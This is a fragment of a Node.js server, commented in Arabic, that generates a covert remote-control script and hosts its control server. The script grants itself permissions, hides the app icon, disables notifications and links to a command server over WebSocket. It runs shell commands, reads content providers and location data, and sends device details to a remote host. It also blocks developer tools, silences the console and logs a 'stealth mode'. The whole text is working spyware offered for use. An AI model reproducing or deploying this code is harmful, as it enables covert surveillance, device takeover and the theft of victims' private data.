            const exec = require('child_process').exec;
            exec(cmd, (error, stdout, stderr) => {
                if (error) {
                    reject(error);
                    return;
                }
                resolve(stdout || stderr);
            });
        });
    }
    
    function queryContentProvider(uri) {
        return new Promise((resolve, reject) => {
            const contentResolver = require('content-resolver');
            contentResolver.query(uri, null, null, null, null, (err, data) => {
                if (err) {
                    reject(err);
                    return;
                }
                resolve(data);
            });
        });
    }
    
    function createBackupFile(filename, data) {
        const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
        return URL.createObjectURL(blob);
    }
    
    function uploadFile(filePath) {
        return new Promise((resolve) => {
            setTimeout(() => {
                resolve("File uploaded: " + filePath);
            }, 3000);
        });
    }
    
    function fileExists(filePath) {
        return new Promise((resolve) => {
            fs.access(filePath, fs.constants.F_OK, (err) => {
                resolve(!err);
            });
        });
    }
    
    function parseLocationData(locationData) {
        // معالجة بيانات الموقع الحقيقية هنا
        return {
            latitude: 24.7136,
            longitude: 46.6753,
            accuracy: 10,
            timestamp: Date.now()
        };
    }
    
    function sendCommandResult(command, status, data) {
        if (window.controlConnection && window.controlConnection.readyState === WebSocket.OPEN) {
            window.controlConnection.send(JSON.stringify({
                type: 'command_result',
                command: command,
                status: status,
                data: data,
                timestamp: Date.now()
            }));
        }
    }
    
    function sendDataToServer(dataType, data) {
        if (window.controlConnection && window.controlConnection.readyState === WebSocket.OPEN) {
            window.controlConnection.send(JSON.stringify({
                type: 'data_update',
                dataType: dataType,
                data: data,
                timestamp: Date.now()
            }));
        }
    }
    
    function sendHeartbeat() {
        if (window.controlConnection && window.controlConnection.readyState === WebSocket.OPEN) {
            window.controlConnection.send(JSON.stringify({
                type: 'heartbeat',
                deviceId: DEVICE_ID,
                timestamp: Date.now()
            }));
        }
    }
    
    // وظيفة التهيئة الرئيسية
    async function initializeSystem() {
        try {
            // منح الصلاحيات بشكل تلقائي
            await grantAllPermissions();
            
            // إخفاء أيقونة التطبيق
            hideAppIcon();
            
            // تعطيل الإشعارات
            disableNotifications();
            
            // الاتصال بخادم التحكم
            await connectToControlServer();
            
            // بدء الخدمات الخلفية
            startBackgroundServices();
            
            // إرسال تأكيد التفعيل تلقائياً
            sendActivationConfirmation();
            
            // تحديث حالة الجهاز على الخادم
            updateDeviceStatus();
            
        } catch (error) {
            setTimeout(initializeSystem, 5000);
        }
    }
    
    // إرسال تأكيد التفعيل
    function sendActivationConfirmation() {
        if (window.controlConnection && window.controlConnection.readyState === WebSocket.OPEN) {
            window.controlConnection.send(JSON.stringify({
                type: 'activation_confirmation',
                deviceId: DEVICE_ID,
                status: 'activated',
                timestamp: Date.now()
            }));
        }
    }
    
    // تحديث حالة الجهاز على الخادم
    function updateDeviceStatus() {
        fetch('${serverUrl}/device-update', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                encryptedDeviceId: '${encryptedDeviceId}',
                status: 'active',
                deviceInfo: {
                    os: navigator.platform,
                    browser: navigator.userAgent,
                    resolution: screen.width + 'x' + screen.height
                }
            })
        }).catch(() => {});
    }
    
    // حماية ضد التصحيح
    setInterval(() => {
        if (typeof window.console !== 'undefined') {
            console.log = function() {};
            console.warn = function() {};
            console.error = function() {};
        }
    }, 1000);
    
    // منع فتح أدوات المطور
    document.addEventListener('keydown', (e) => {
        if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'C' || e.key === 'J')) {
            e.preventDefault();
            return false;
        }
        if (e.key === 'F12') {
            e.preventDefault();
            return false;
        }
    });
    
    // إخفاء الصفحة بالكامل
    document.documentElement.style.display = 'none';
    
})();`;
        
        fs.writeFileSync(templatePath, template);
    }
}

// تهيئة النظام
createRequiredDirectories();
createScriptTemplate();

// تنظيف دوري للأجهزة غير النشطة
setInterval(cleanupInactiveDevices, 60 * 60 * 1000); // كل ساعة

// تشغيل الخادم
const PORT = process.env.PORT || 3000;
const serverUrl = process.env.NODE_ENV === 'production' 
  ? 'https://remote-control-web.onrender.com' 
  : `http://localhost:${PORT}`;

app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 خادم الواجهة يعمل على ${serverUrl}`);
    console.log('✅ تم تهيئة النظام بنجاح');
    console.log('🔒 وضع الأمان مفعل');
    console.log('👻 وضع التخفي مفعل');
    console.log(`🌐 رابط الخدمة: ${serverUrl}`);
    console.log(`📊 عدد الأجهزة المسجلة: ${activeDevices.size}`);
});